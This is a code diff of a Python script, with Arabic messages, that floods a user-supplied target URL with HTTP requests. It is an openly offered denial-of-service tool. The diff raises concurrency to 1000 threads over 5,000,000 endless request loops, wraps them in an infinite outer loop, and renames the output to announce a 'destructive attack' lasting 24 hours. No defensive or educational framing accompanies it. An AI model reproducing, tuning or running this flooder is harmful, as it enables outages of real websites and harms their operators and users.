@@ -21,25 +21,26 @@ def attack(url):
     while True:
         try:
             response = session.get(url, headers=headers)
-            print("🚀🚀🚀 تم إطلاق صاروخ طلب إلى:", url)
+            print(f"🚀🚀🚀 الهجوم جارٍ على {url}!")
         except Exception as e:
-            print("💥💥💥 أوه لا! حدث خطأ مجنون:", e)
+            print(f"💥💥💥 خطأ فادح: {e}")
 
 def start_attack(url):
-    with ThreadPoolExecutor() as executor:
+    # استخدام ThreadPoolExecutor لتحسين الأداء
+    with ThreadPoolExecutor(max_workers=1000) as executor:
         for _ in range(5000000):
             executor.submit(attack, url)
 
     # الطلب الأولي خارج الهجمات
     try:
         response = session.get(url, headers=headers)
-        print("🔥🔥🔥 النتيجة الأولية:", response.text)
+        print(f"🔥🔥🔥 الرد الأولي:\n{response.text}")
     except Exception as e:
-        print("💥💥💥 خطأ أولي مجنون:", e)
+        print(f"💥💥💥 خطأ أثناء الطلب الأولي: {e}")
 
-url = input("🎯 أدخل رابط الهدف المجنون: ")
+url = input("🎯 أدخل رابط الهدف: ")
 
-print("💣💣💣 بدء الهجوم المجنون بشكل مستمر على مدار 24 ساعة 💣💣💣")
+print("💣💣💣 بدء الهجوم المدمر بشكل مستمر على مدار 24 ساعة 💣💣💣")
 
 while True:
     start_attack(url)
